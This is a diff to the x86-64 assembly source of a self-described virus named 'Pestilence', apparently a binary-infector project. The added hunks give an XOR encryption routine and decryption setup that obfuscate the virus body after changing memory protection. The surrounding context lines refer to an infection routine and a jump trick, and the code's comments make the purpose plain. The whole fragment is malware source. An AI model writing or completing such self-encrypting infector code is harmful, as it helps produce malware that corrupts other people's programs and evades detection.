@@ -36,6 +36,30 @@ _start:
 
 signature db `Pestilence version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
 
+;                      v dst       v len      v key       v key_size
+_xor_encrypt:; (void *rdi, size_t rsi, void *rdx, size_t rcx)
+	push r8
+	push r9
+
+	xor r8, r8; i len
+	.reset_key_size:
+		xor r9, r9; j key_size
+	.loop_bytes:
+		cmp r8, rsi
+		je .return
+		cmp r9, rcx
+		je .reset_key_size
+		mov al, byte[rdx + r9]; key[j]
+		xor byte[rdi + r8], al
+		inc r8
+		inc r9
+	jmp .loop_bytes
+	.return:
+
+	pop r9
+	pop r8
+ret
+
 _h3ll0w0rld:
 	pop r8; pop addr from stack
 	sub r8, 0x5; sub call instr
@@ -58,7 +82,7 @@ _h3ll0w0rld:
 ; =
 
 	cmp rax, 0x0
-	jz .ahah-2; has to jmp on [48 31 c0] -> xor rax, rax
+	jz .ahah - 2; has to jmp on [48 31 c0] -> xor rax, rax
 	jmp .here
 	.code: ; so it's crypted right ? EVERYTHING IS KEEEYYY
 		push rdx
@@ -74,6 +98,10 @@ _h3ll0w0rld:
 		syscall; change protect from file to _eof
 		pop rdx
 
+		lea rdi, [rel .virus]
+		mov rdx, rdi
+		lea rsi, [rel _pack_start]
+		sub rdi, rsi
 		; TODO: XOR DESENCRYPTION HERE
 
 	jmp .infected; TODO: has to jmp on [eb 27] (previously $-15)
@@ -156,7 +184,7 @@ _h3ll0w0rld:
 			add rdi, rdx
 			add rsi, rdx
 			mov rax, [rel length]
-			sub rax, rdx; length - [packed_part - params]
+			sub rax, rdx; length - [_pack_start - params]
 			push rax
 			pop rdx
 
